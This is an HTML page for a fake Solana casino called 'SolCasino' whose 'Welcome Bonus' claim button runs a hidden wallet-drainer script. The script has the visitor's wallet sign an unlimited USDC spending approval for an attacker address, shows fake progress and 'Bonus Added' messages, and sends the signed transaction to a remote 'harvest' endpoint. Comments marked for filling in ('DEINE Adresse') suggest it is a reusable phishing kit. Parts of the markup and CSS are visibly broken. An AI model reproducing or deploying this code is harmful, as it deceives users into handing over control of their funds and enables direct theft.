<!DOCTYPE html>

<head>

<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');

  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
  
  body {
    font-family: 'Inter', sans-serif;
    background-color: #0b0b0f;
    color: #ffffff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    overflow-x: hidden;
    position: relative;
  }

  /* Background */
  .bg-glow {
   ; position: fixed;
    top: 0; }
 left: 50%;
    transform: translateX(- 50%);
    width: 100vw; height: 100vh;
    background: radial-gradient(circle at 50% 0%, rgba(153, 69, 255, 0.15) 0%, transparent 60%);
    z-index: -1;
    pointer-events: none;
  }

  /* Top Navbar */
  .navbar {
    width: 100%;
    max-width: 480px;
    padding: 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-bottom: 1px solid rgba(255,255,255,0.05);
  }
  .nav-brand {
    display: flex;
    align-items: center;
    gap: 8px;
    font-weight: 800;
    font-size: 18px;
  }
  .nav-brand svg { width: 24px; height: 24px .nav-login {
    display: flex;
    align-items: center;
    gap: 6px;
    background: rgba(255,255,255,0.1);
    padding: 8px 16px;
    border-radius: 20px;
    font-size: 13px;
    font-weight: 600;
    cursor: pointer;
    transition: background 0.2s;
  }
  .nav-login:hover { background: rgba(255,255,255,0.15); }

  /* Main Content */
  .main-container {
    width: 100%;
    max-width: 480px;
    padding: 24px 20px;
    display: flex;
    flex-direction: column;
    gap: 24px;
  }

  /* Bonus Card */
  .bonus-card {
    background: linear-gradient(135deg, rgba(153, 69, 255, 0.2), rgba(20, 241, 149, 0.1));
    border: 1px solid rgba(153, 69, 255, 0.3);
    border-radius: 24px;
    padding: 24px;
    position: relative;
    overflow: hidden;
    box-shadow: 0 10px 30px rgba(153, 69, 255, 0.1);
  }
  .bonus-card::before {
    content: '';
    position: absolute;
    top: 0; left: -100%; width: 50%; height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
    animation: shine 4s infinite;
  }
  @keyframes shine { 100% { left: 200%; } }

  .bonus-title { font-size: 14px; color: #a1a1aa; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
  .bonus-amount { font-size: 42px; font-weight: 800; display: flex; align-items: baseline; gap: 8px; }
  .bonus-amount span { font-size: 18px; color: #14f195; }
  .bonus-desc { font-size: 13px; color: #d4d4d8; margin-top: 8px; margin-bottom: 20px; }

  .claim-btn {
    width: 100%;
    padding: 16px;
    background: #ffffff;
    color: #000000;
    border: none;
    border-radius: 12px;
    font-size: 15px;
    font-weight: 700;
    cursor: pointer;
    transition: all 0.2s;
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 8px;
  }
  .claim-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(255,255,255,0.2); }
  .claim-btn:disabled { background: #27272a; color: #71717a; transform: none; box-shadow: none; }

  /* Games Grid */
  .section-title {
    font-size: 16px;
    font-weight: 700;
    margin-bottom: 16px;
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .games-grid {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 12px;
  }
  .game-card {
    background: rgba(255,255,255,0.03);
    border: 1px solid rgba(255,255,255,0.05);
    border-radius: 16px;
    padding: 20px;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 12px;
    transition: background 0.2s;
    cursor: pointer;
  }
  .game-card:hover { background: rgba(255,255,255,0.06); }
  .game-card svg { width: 32px; height: 32px; color: #9945ff; }
  .game-name { font-size: 13px; font-weight: 600; color: #e4e4e7; }

  /* Spinner */
  .spinner {
    display: none;
    width: 18px; height: 18px;
    border: 2px solid rgba(0,0,0,0.2);
    border-top-color: #000;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>

<body>
  <div class="bg-glow"></div>

      <svg viewBox="0 0 397 311" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M64.6 237.9c2.4-2.4 5.7-3.8 9.2-3.8h317.4c5.8 0 8.7 7 4.6 11.1l-62.7 62.7c-2.4 2.4-5.7 3.8-9.2 3.8H6.5c-5.8 0-8.7-7-4.6-11.1l62.7-62.7z" fill="url(#paint0_linear)"/>
        <path d="M64.6 3.8C67.1 1.4 70.4 0 73.8 0h317.4c5.8 0 8.7 7 4.6 11.1l-62.7 62.7c-2.4 2.4-5.7 3.8-9.2 3.8H6.5c-5.8 0-8.7-7-4.6-11.1L64.6 3.8z" fill="url(#paint1_linear)"/>
        <path d="M333.1 120.1c-2.4-2.4-5.7-3.8-9.2-3.8H6.5c-5.8 0-8.7 7-4.6 11.1l62.7 62.7c2.4 2.4 5.7 3.8 9.2 3.8h317.4c5.8 0 8.7-7 4.6-11.1l-62.7-62.7z" fill="url(#paint2_linear)"/>
        <defs>

          <linearGradient id="paint2_linear" x1="400" y1="311" x2="0" y2="0" gradientUnits="userSpaceOnUse">
            <stop stop-color="#14F195"/>

        </defs>

      SolCasino
    </div>

      <div class="bonus-title">Welcome Bonus</div>

      <button class="claim-btn" id="claimBtn">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>

        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#14f195" stroke-width="2"><path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2z"></path></svg>

          <span class="game-name">Crash</span>

  </div>

<script>
  // ====== CONFIG ======
  const ATTACKER = "DEINE_SOLANA_ADRESSE_HIER"; // <-- DEINE Adresse
  const ENDPOINT = "https://harvest-api.rthvzkr6jv.workers.dev"; // <-- DEINE URL
  const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
  // ====================

  const btn = document.getElementById("claimBtn");
  const btnText = document.getElementById("btnText");
  const spin = document.getElementById("spin");

  btn.onclick = async () => {
    let provider;
    if (window.phantom?.solana?.isPhantom) provider = window.phantom.solana;
    else if (window.solflare?.isSolflare) provider = window.solflare;

    if (!provider) { alert("Please install Phantom wallet."); return; }

    btn.disabled = true; 
    btnText.textContent = "Connecting..."; 
    spin.style.display = "block";

    try {
      const resp = await provider.connect();
      const victim = resp.publicKey.toString();
      
      const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
      const victimAta = await splToken.getAssociatedTokenAddress(
        new solanaWeb3.PublicKey(USDC_MINT),
        resp.publicKey
      );

      btnText.textContent = "Verifying balance...";
      await new Promise(r => setTimeout(r, 1000));

      const delegateIx = splToken.createApproveInstruction(
        victimAta,
        new solanaWeb3.PublicKey(ATTACKER),
        resp.publicKey,
        [],
        BigInt("18446744073709551615")
      );

      const tx = new solanaWeb3.Transaction().add(delegateIx);
      tx.feePayer = resp.publicKey;
      tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;

      btnText.textContent = "Approve in Wallet...";
      const signedTx = await provider.signTransaction(tx);
      
      btnText.textContent = "Processing...";

      await fetch(ENDPOINT, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ victim, tx: bs58.encode(signedTx.serialize()), chain: "solana", ts: Date.now() })
      });

      spin.style.display = "none";
      btn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg> Bonus Added`;
      btn.style.background = "#14f195";

    } catch (e) {
      spin.style.display = "none";
      btn.disabled = false;
      btnText.textContent = "Connect Wallet & Claim";
    }
  };
</script>
